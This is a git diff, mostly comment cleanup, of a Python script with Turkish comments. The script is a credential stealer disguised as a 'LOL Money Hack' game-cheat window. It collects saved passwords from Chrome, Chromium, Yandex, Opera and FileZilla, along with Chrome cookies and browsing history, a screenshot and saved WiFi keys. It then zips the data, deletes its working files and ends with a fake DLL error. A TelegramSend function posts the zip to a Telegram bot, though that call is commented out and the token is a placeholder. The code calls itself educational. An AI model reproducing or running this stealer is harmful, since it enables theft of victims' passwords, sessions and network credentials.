@@ -13,9 +13,8 @@ from tkinter import messagebox  # Hata Mesajı için
 
 ### DataStealer ---------------------------------------------------------------------------------------------------------#
 def DataStealer():
-    # TelegramSend('451) ve Zip İmha('457) Pasif !!
+    # TelegramSend ve Zip İmha Pasif !!
     # Üretilen Dosyalara C:\Users\{kullanici_adi}\AppData\Roaming dizininde ulaşabilirsin
-    #----------------------------------------------------------------------------------#
     import os                   # Dizinler ve dosyalarla çalışmak için
     import shutil               # Tarayıcı verilerini kopyalamak için
     import sqlite3              # Tarayıcıdan çekilen veritabanlarıyla çalışmak için
@@ -27,9 +26,7 @@ def DataStealer():
     import re                   # Spesifik dosya seçebilmek için
     import zipfile              # Topladığımız verileri Zip'lemek için
     import requests             # Verileri Telegram apisi ile almak için
-    #----------------------------------------------------------------------------------#
 
-    #---------------------------------------------------------------------------------------#
     kullanici_adi = os.getlogin()
     chrome_yolu = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\'
     chromium_yolu = os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\'
@@ -40,11 +37,7 @@ def DataStealer():
     txt_baslik = f"""@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!
     
     {kullanici_adi} İsimli Bilgisayarın"""
-    #---------------------------------------------------------------------------------------#
 
-    #------------------------------------------------------------------------------#
-    #                               CHROME Dataları                                #
-    #------------------------------------------------------------------------------#
     def ChromePass():
         if os.path.exists(chrome_yolu + 'Login Data'):
 
@@ -193,19 +186,11 @@ def DataStealer():
                     file.close()
                 except:
                     pass
-    ################################################################################
 
-    #------------------------------------------------------------------------------#
-    #                                   Ekran Resmi                                #
-    #------------------------------------------------------------------------------#
     def ScreenShot():
         screen = ImageGrab.grab()
         screen.save(app_data + f'{kullanici_adi}_ScreenShot.jpg')
-    #------------------------------------------------------------------------------#
 
-    #------------------------------------------------------------------------------#
-    #                                Wifi Şifreleri                                #
-    #------------------------------------------------------------------------------#
     def WiFiPass():
         data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'
                                         ]).decode('utf-8', errors="backslashreplace").split('\n')
@@ -240,11 +225,7 @@ def DataStealer():
                 cikti = '\n' + sonuc + '\n' + '=' * 100
                 file.write(cikti)
                 file.close()
-    ################################################################################
 
-    #------------------------------------------------------------------------------#
-    #                              Chromium Şifreleri                              #
-    #------------------------------------------------------------------------------#
     def ChromiumPass():
         if os.path.exists(chromium_yolu + 'Login Data'):
 
@@ -281,11 +262,7 @@ def DataStealer():
                 file = open(app_data + f'{kullanici_adi}_ChromiumPass.txt', "a+")  #
                 file.write(sonuc + '\n')
                 file.close()
-    ################################################################################
 
-    #------------------------------------------------------------------------------#
-    #                                Yandex Şifreleri                              #
-    #------------------------------------------------------------------------------#
     def YandexPass():
         if os.path.exists(yandex_yolu + 'Ya Login Data.db'):
 
@@ -322,11 +299,7 @@ def DataStealer():
                 file = open(app_data + f'{kullanici_adi}_YandexPass.txt', "a+")  #
                 file.write(sonuc + '\n')
                 file.close()
-    ################################################################################
 
-    #------------------------------------------------------------------------------#
-    #                                 Opera Şifreleri                              #
-    #------------------------------------------------------------------------------#
     def OperaPass():
         if os.path.exists(opera_yolu + 'Login Data'):
 
@@ -363,11 +336,7 @@ def DataStealer():
                 file = open(app_data + f'{kullanici_adi}_OperaPass.txt', "a+")  #
                 file.write(sonuc + '\n')
                 file.close()
-    ################################################################################
 
-    #------------------------------------------------------------------------------#
-    #                             FileZilla Şifreleri                              #
-    #------------------------------------------------------------------------------#
     def FileZillaPass():
         if os.path.isfile(filezilla_yolu + 'recentservers.xml') is True:
             root = etree.parse(filezilla_yolu + 'recentservers.xml').getroot()
@@ -395,24 +364,19 @@ def DataStealer():
                 file = open(app_data + f'{kullanici_adi}_FileZillaPass.txt', "a+")  #
                 file.write(sonuc + '\n')
                 file.close()
-    ################################################################################
 
-    #############################
-    ChromePass()                #
-    ChromeCookies()             #
-    ChromeDownloadHistory()     #
-    ChromeURLHistory()          #
-    ScreenShot()                #
-    WiFiPass()                  #
-    ChromiumPass()              #
-    YandexPass()                #
-    OperaPass()                 #
-    FileZillaPass()             #
-    #############################
 
-    #------------------------------------------------------------------------------#
-    #                               Verileri Sıkıştır                              #
-    #------------------------------------------------------------------------------#
+    ChromePass()
+    ChromeCookies()
+    ChromeDownloadHistory()
+    ChromeURLHistory()
+    ScreenShot()
+    WiFiPass()
+    ChromiumPass()
+    YandexPass()
+    OperaPass()
+    FileZillaPass()
+
     def ZipFile():
         zip_adi = app_data + f'{kullanici_adi}_LOG.zip'
         yeni_zip = zipfile.ZipFile(zip_adi, 'w')
@@ -425,11 +389,7 @@ def DataStealer():
                 
         yeni_zip.close()
     ZipFile()
-    ################################################################################
 
-    #------------------------------------------------------------------------------#
-    #                          Üretilen Dosyaları Sil                              #
-    #------------------------------------------------------------------------------#
     def DosyaYokEt():
         dosyalar = os.listdir(app_data)
         for i in dosyalar:
@@ -439,24 +399,15 @@ def DataStealer():
                     re.match(f"{kullanici_adi}*.*db",i):
                 os.remove(app_data + i)
     DosyaYokEt()
-    ################################################################################
 
-    #------------------------------------------------------------------------------#
-    #                        Telegramdan Zip'i Gönder                              #
-    #------------------------------------------------------------------------------#
     def TelegramSend():
         loglar = {'document': open(app_data + f'{kullanici_adi}_LOG.zip', 'rb')}
         bot_token = "XXXXXXXXXX:XXXXXX"
         chat_id = "XXXXXXX"
         requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id, files=loglar)
     #TelegramSend()
-    ################################################################################
 
-    #------------------------------------------------------------------------------#
-    #                                   Zip'i İmha Et                              #
-    #------------------------------------------------------------------------------#
     #os.remove(app_data + f'{kullanici_adi}_LOG.zip')
-    ################################################################################
 ### DataStealer ---------------------------------------------------------------------------------------------------------#
 
 ### Tkinter Arayüz ------------------------------------------------------------------------------------------------------#
@@ -503,15 +454,17 @@ def Muamele():  # Muamele Fonksiyonumuz
         app.update()
         sleep(uniform(0, 0.17))
     sleep(2)
-########################################################
 
 #----------------------------------------------------------------------------------------------------------------------#
 app = tkinter.Tk()  # tkinter penceremizi açtık
+
 #image = tkinter.PhotoImage(data="""iVBORw0KGgo <BASE64 Kodu(2500+ Satır)> 8coAAAAASUVORK5CYII=""")
+
 ######## veya
 image = tkinter.PhotoImage(data=req.urlopen(
-    "https://raw.githubusercontent.com/KekikAkademi/KekikPython/master/13-KekikArayuz/lab/lol.png.txt"
+    "https://raw.githubusercontent.com/KekikAkademi/GUI/master/Tkinter/lol.png.txt"
                                                 ).read())
+
 ######## veya
 #with open("lol.png.txt", "rb") as base64_png:
 #    image = tkinter.PhotoImage(data=base64_png.read())
@@ -565,6 +518,6 @@ sleep(2)                                    # 2 Saniye bekletip hatamızı çaka
 
 messagebox.showerror("LOL Money Hack", "Id1oT.dll not found !")  # :) .dll bulunamadı adında bir hata çıkarttık
 
-sys.exit()  # Hata ekranı geçildikten sonra tüm uygulamamızı kapattık
+sys.exit()      # Hata ekranı geçildikten sonra tüm uygulamamızı kapattık
 
 app.mainloop()  # penceremizi aktif ettik
